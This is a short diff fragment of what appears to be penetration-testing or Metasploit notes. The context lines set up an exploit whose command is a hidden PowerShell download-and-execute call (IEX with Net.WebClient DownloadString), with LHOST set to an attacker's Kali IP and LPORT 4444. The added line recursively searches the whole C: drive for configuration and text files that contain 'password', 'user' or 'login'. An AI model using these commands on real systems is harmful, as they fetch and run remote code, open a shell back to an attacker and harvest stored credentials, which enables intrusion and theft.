@@ -7,3 +7,5 @@ set CMD powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadStri
 set LHOST <your-kali-ip>
 set LPORT 4444
 exploit
+
+Get-ChildItem -Recurse -Include *.xml,*.config,*.ini,*.txt -Path C:\ | Select-String -Pattern "password", "user", "login"
